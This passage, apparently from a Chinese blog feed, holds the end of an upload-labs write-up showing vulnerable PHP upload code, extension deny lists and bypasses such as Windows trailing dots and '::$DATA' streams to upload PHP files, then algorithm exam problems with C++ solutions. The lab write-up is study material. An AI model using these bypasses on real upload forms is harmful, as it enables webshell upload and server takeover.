<div class="hljs"><pre><code>$file_ext = trim($file_ext); //首尾去空</code></pre></div><p> <strong>利用Windows系统的文件名特性。文件名最后增加空格和点，写成<code>1.php .</code>，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个<code>.</code>会被去掉，实际上保存的文件名就是1<code>.php</code></strong> </p>
<p><img src="https://i.loli.net/2020/11/30/QsiotIUBjlkmYqc.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass8"><a href="#pass8" class="headerlink" title="pass8"></a>pass8</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);
        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span>
        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span>
        $file_ext = trim($file_ext); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;
            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.$file_name;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;
                $is_upload = <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                $msg = <span class="hljs-string">'上传出错！'</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'此文件类型不允许上传！'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    &#125;
&#125;</code></pre></div>

<p>这段代码少了这句话，可以与第六关相同的做法</p>
<p><code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p>
<p><img src="https://i.loli.net/2020/11/30/tyb45fg3MiCU1jG.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span>
        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);
        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span>
        $file_ext = trim($file_ext); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;
            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.date(<span class="hljs-string">"YmdHis"</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;
                $is_upload = <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                $msg = <span class="hljs-string">'上传出错！'</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'此文件类型不允许上传！'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    &#125;
&#125;</code></pre></div>

<p>仔细观察发现少了这段代码</p>
<div class="hljs"><pre><code class="hljs php">$file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span></code></pre></div>

<p> 采用Windows文件流特性绕过 </p>
<p>将文件名改为 <code>1.php::$DATA</code>,但是实质上保存的文件还是1.php</p>
<p><img src="https://i.loli.net/2020/11/30/XKUGAeVRzTxNW8Y.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span>
        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);
        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span>
        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span>
        $file_ext = trim($file_ext); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;
            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.$file_name;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;
                $is_upload = <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                $msg = <span class="hljs-string">'上传出错！'</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'此文件类型不允许上传！'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    &#125;
&#125;</code></pre></div>

<p> 这一句代码是用来检测末尾是否是<code>.</code>，可以双写绕过。<br>抓包将文件名改为<code>1.php. .</code> （注意两点之间有空格） 前面去掉.然后检验.不存在，再去空格，留下php.，然后php.不属于$deny_ext数组中存在的，当然就直接提交了。因为windows自动去点，于是php后缀就出来了 </p>
<img src="https://i.loli.net/2020/11/30/wldCgUcOSKWPxMu.png" srcset="/img/loading.gif" style="zoom:50%;">

]]></content>
      <categories>
        <category>文件上传</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>MIME</tag>
        <tag>大小写绕过</tag>
        <tag>.htaccess</tag>
        <tag>windows文件特性</tag>
      </tags>
  </entry>
  <entry>
    <title>算法上机复习</title>
    <url>/2020/11/04/%E7%AE%97%E6%B3%95%E4%B8%8A%E6%9C%BA%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<p>最近算法实验要上机考试，所以还是准备一下吧(还不是因为自己太菜了)</p>
<a id="more"></a>

<h1 id="16级题目"><a href="#16级题目" class="headerlink" title="16级题目"></a>16级题目</h1><h2 id="问题-A-星空梦想——鲁班"><a href="#问题-A-星空梦想——鲁班" class="headerlink" title="问题 A: 星空梦想——鲁班"></a>问题 A: 星空梦想——鲁班</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>鲁班七号是王者峡谷里的射手，站撸英雄。战场上的鲁班七号，机制强大的鲨嘴炮，立刻将挡在前路的任何物体轰飞。正如他所说的，“借你们的肉体试验下新发明的威力”。是的，这就是鲁班大师和他的天才机关造物鲁班七号。然而，鲁班最为致命的缺点是腿短，跑得慢，一个稍不留神，便会被刺客所击杀。</p>
<p>既然腿短，那么就来多多运动吧，跳跳台阶可还行？假设鲁班七号一次可以跳上1级台阶，但极限一次只能跳上2级台阶（腿短没办法，嘤嘤嘤）。鲁班七号现在从0级阶梯开始，最终跳上第n级的台阶，求总共有多少种跳法？</p>
<h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。</p>
<p>第一行输入包含一个整数T（1&lt;=T&lt;=50），代表测试用例个数。</p>
<p>接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=50），代表鲁班最终跳上了第n级台阶。</p>
<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表鲁班最终跳上第n级台阶的跳法种数。</p>
<h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">3</span>
<span class="hljs-number">3</span>
<span class="hljs-number">4</span>
<span class="hljs-number">50</span></code></pre></div>

<h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">3</span>
<span class="hljs-number">5</span>
<span class="hljs-number">20365011074</span></code></pre></div>

<h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><p>注意结果超过int范围，请用long long类型存储ans</p>
<div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">50</span>;
<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> f[N];
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	f[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>,f[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">2</span>;i&lt;=<span class="hljs-number">50</span>;i++)
	&#123;
		f[i]=f[i<span class="hljs-number">-1</span>]+f[i<span class="hljs-number">-2</span>];
	&#125;
	<span class="hljs-keyword">int</span> n;
	<span class="hljs-built_in">cin</span>&gt;&gt;n;
	<span class="hljs-keyword">while</span>(n--)
	&#123;
		<span class="hljs-keyword">int</span> m;
		<span class="hljs-built_in">cin</span>&gt;&gt;m;
		<span class="hljs-built_in">cout</span>&lt;&lt;f[m]&lt;&lt;<span class="hljs-built_in">endl</span>;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
 &#125;</code></pre></div>



<h2 id="问题-B-午夜歌剧——元歌"><a href="#问题-B-午夜歌剧——元歌" class="headerlink" title="问题 B: 午夜歌剧——元歌"></a>问题 B: 午夜歌剧——元歌</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>元歌是王者峡谷里的刺客。何谓至高机关之美呢？唯有以至高权力的手令太古奇迹重现人世，方能称得上啊。</p>
<p>是的，元歌擅长操控，所做傀儡能起到以假乱真的作用，今天元歌的傀儡变成你的初中数学老师，给你出个数学题：给你一个数字x，让你求出k7、k6、k5、k4、k3、k2、k1、k0（0&lt;=ki&lt;=9），使得以下等式1成立，最后根据等式2求出最终ans值。</p>
<p>等式1：</p>
<p><img src="https://s1.ax1x.com/2018/11/07/iTxDvF.png" srcset="/img/loading.gif" alt="img"></p>
<p>等式2：</p>
<p><img src="https://s1.ax1x.com/2018/11/07/iTxsu4.png" srcset="/img/loading.gif" alt="img"></p>
<h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。</p>
<p>第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。</p>
<p>接下来T行，每一行包含一个整数x（1&lt;=x&lt;=1500000）。</p>
<h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表最终运算结果。</p>
<h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">3</span>
<span class="hljs-number">7</span>
<span class="hljs-number">143</span>
<span class="hljs-number">3223193224</span></code></pre></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">10</span>
<span class="hljs-number">151</span>
<span class="hljs-number">163311433223</span></code></pre></div>

<h3 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h3><p>测试数据均大于等于1，不用特判0</p>
<p>感觉图片等式有点问题，一开始没理解什么意思，后来看了学长的提示。本质就是进制转换。</p>
<div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> t,m;
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">convert</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">int</span> c,r;
	r=n%<span class="hljs-number">7</span>;
	c=n/<span class="hljs-number">7</span>;
	<span class="hljs-keyword">if</span>(c&gt;<span class="hljs-number">0</span>)
	&#123;
		convert(c);
		<span class="hljs-built_in">cout</span>&lt;&lt;r;
	&#125;
	<span class="hljs-keyword">else</span>
	<span class="hljs-built_in">cout</span>&lt;&lt;n;
&#125; 
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;t;
	<span class="hljs-keyword">while</span>(t--)
	&#123;
		<span class="hljs-built_in">cin</span>&gt;&gt;m;
		convert(m);
		<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
 &#125;</code></pre></div>

<h2 id="问题-C-圣诞恋歌——貂蝉"><a href="#问题-C-圣诞恋歌——貂蝉" class="headerlink" title="问题 C: 圣诞恋歌——貂蝉"></a>问题 C: 圣诞恋歌——貂蝉</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>貂蝉是王者峡谷里的法师/刺客，貂蝉打法一定要注意配合技能与被动。半肉出装加上蛇皮走位，往往可以1打5，轻松拿下5杀。语花印被动描述为：技能命中会为敌人叠加花之印记，叠加满4层后印记触发被动，会给自身回复生命，同时会对周围敌人造成真实伤害并减速。<br>我们现在对貂蝉的技能及被动进行简化如下：每使用1次技能会攻击1次目标，每攻击3次目标，会自动额外攻击1次目标。<br>现在，貂蝉在游戏中使用了n次技能，请问总共会给目标带来多少次攻击。</p>
<h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p>多组测试数据，第一行输入包含一个整数T，代表测试样例个数。<br>接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=100），代表貂蝉使用了n次技能。</p>
<h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表貂蝉对目标进行了ans次攻击。</p>
<h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">6</span>
<span class="hljs-number">1</span>
<span class="hljs-number">2</span>
<span class="hljs-number">3</span>
<span class="hljs-number">45</span>
<span class="hljs-number">81</span></code></pre></div>

<h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">1</span>
<span class="hljs-number">2</span>
<span class="hljs-number">4</span>
<span class="hljs-number">57</span>
<span class="hljs-number">121</span></code></pre></div>

<h3 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h3><p>这题就是汽水瓶的改编。。。</p>
<div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">int</span> n;
	<span class="hljs-built_in">cin</span>&gt;&gt;n; 
	<span class="hljs-keyword">while</span>(n--)
	&#123;
		<span class="hljs-keyword">int</span> m,sum;
		<span class="hljs-built_in">cin</span>&gt;&gt;m;
		sum=<span class="hljs-number">0</span>;
		<span class="hljs-keyword">while</span>(m&gt;<span class="hljs-number">3</span>)
		&#123;
			m=m<span class="hljs-number">-2</span>;
			sum=sum+<span class="hljs-number">3</span>;
		&#125;	
		<span class="hljs-keyword">if</span>(m==<span class="hljs-number">3</span>)
		sum+=<span class="hljs-number">4</span>;
		<span class="hljs-keyword">else</span>
		sum=m;
		<span class="hljs-built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="hljs-built_in">endl</span>; 
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>

<h2 id="问题-D-海之征途——孙策"><a href="#问题-D-海之征途——孙策" class="headerlink" title="问题 D: 海之征途——孙策"></a>问题 D: 海之征途——孙策</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>孙策是王者峡谷里的坦克/战士。大船靠岸，江郡欢呼着迎来了他们的新领袖，人称江东小霸王的年轻人。游戏中，孙策的技能长帆破浪，可以驾船冲锋，可将船撞向敌方单位或者阻挡物，并造成一定的伤害。</p>
<p>现在，有一群好奇的江郡小朋友想跟着孙策一起出海航行，但孙策的船承载不了所有小朋友，所以孙策决定，尽可能带更多的小朋友出海，现在请你帮孙策谋一个策略，使得更多的小朋友有机会出海航行。已知的条件是孙策船的最大载重m，以及n个小朋友的体重。</p>
<h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。<br>第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。</p>
<p>每组测试用例第一行有两个整数m和n。（0&lt;=m&lt;=1000， 0&lt;=n&lt;=1000），分别代表船的载重重量和小朋友的个数，接下来一行为n个小朋友的体重。</p>
<h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表最多能有ans个小朋友跟着一起出海。</p>
<h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><div class="hljs"><pre><code class="hljs basic"><span class="hljs-number">2</span>
<span class="hljs-symbol">10 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">3 </span><span class="hljs-number">5</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span>
<span class="hljs-symbol">20 </span><span class="hljs-number">9</span>
<span class="hljs-symbol">3 </span><span class="hljs-number">5</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">1</span> <span class="hljs-number">8</span> <span class="hljs-number">5</span> <span class="hljs-number">9</span></code></pre></div>

<h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">3</span>
<span class="hljs-number">6</span></code></pre></div>

<h3 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h3><p>就是简单的装在问题</p>
<div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> T,m,n;
<span class="hljs-keyword">int</span> w[<span class="hljs-number">1005</span>];
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;T;
	<span class="hljs-keyword">while</span>(T--)
	&#123;
		<span class="hljs-keyword">int</span> ans=<span class="hljs-number">0</span>;
		<span class="hljs-built_in">cin</span>&gt;&gt;m&gt;&gt;n;
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
		&#123;
			<span class="hljs-built_in">cin</span>&gt;&gt;w[i];
		&#125;
		sort(w,w+n);
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
		&#123;
			<span class="hljs-keyword">if</span>(m&gt;=w[i])
			&#123;
				ans++;
				m-=w[i];
			&#125;
			<span class="hljs-keyword">else</span>
			<span class="hljs-keyword">break</span>; 
		&#125; 
		<span class="hljs-built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="hljs-built_in">endl</span>;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>

<h2 id="问题-E-极冰防御——盾山"><a href="#问题-E-极冰防御——盾山" class="headerlink" title="问题 E: 极冰防御——盾山"></a>问题 E: 极冰防御——盾山</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>盾山是王者峡谷里的辅助，一夫当关、万夫莫开，一个好的辅助往往可以给团队带来极大帮助。</p>
<p>盾山的游戏中的一个技能为不动如山：手握一块由石头组成的巨盾，张开巨盾砸向地面，将敌人推开，并持续一段时间。</p>
<p>假设盾山最多只能承受C重量的盾牌，而现在有N个小石头，每个石头i的重量为Wi，防御值为Pi。那么，呆萌的盾山想知道，他从N个小石头中挑选M个（M&lt;=N）组成他可承受盾牌，最大的防御值是多少？</p>
<h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。<br>第一行输入包含一个整数T（1&lt;=T&lt;=10），代表测试用例个数。</p>
<p>接下来有T组测试用例。每组测试用例第一行为盾山承受盾牌的最大重量C(C&lt;10000)和小石头的个数N(N&lt;1000)。接下来的N行分别为小石头的重量Wi(1&lt;=Wi&lt;=100)和防御值Pi(1&lt;=Pi&lt;=3000000)。</p>
<h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表可承受盾牌的最大防御值。</p>
<h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><div class="hljs"><pre><code class="hljs basic"><span class="hljs-number">1</span>
<span class="hljs-symbol">10 </span><span class="hljs-number">5</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">6</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">3</span>
<span class="hljs-symbol">6 </span><span class="hljs-number">5</span>
<span class="hljs-symbol">5 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">4 </span><span class="hljs-number">6</span></code></pre></div>

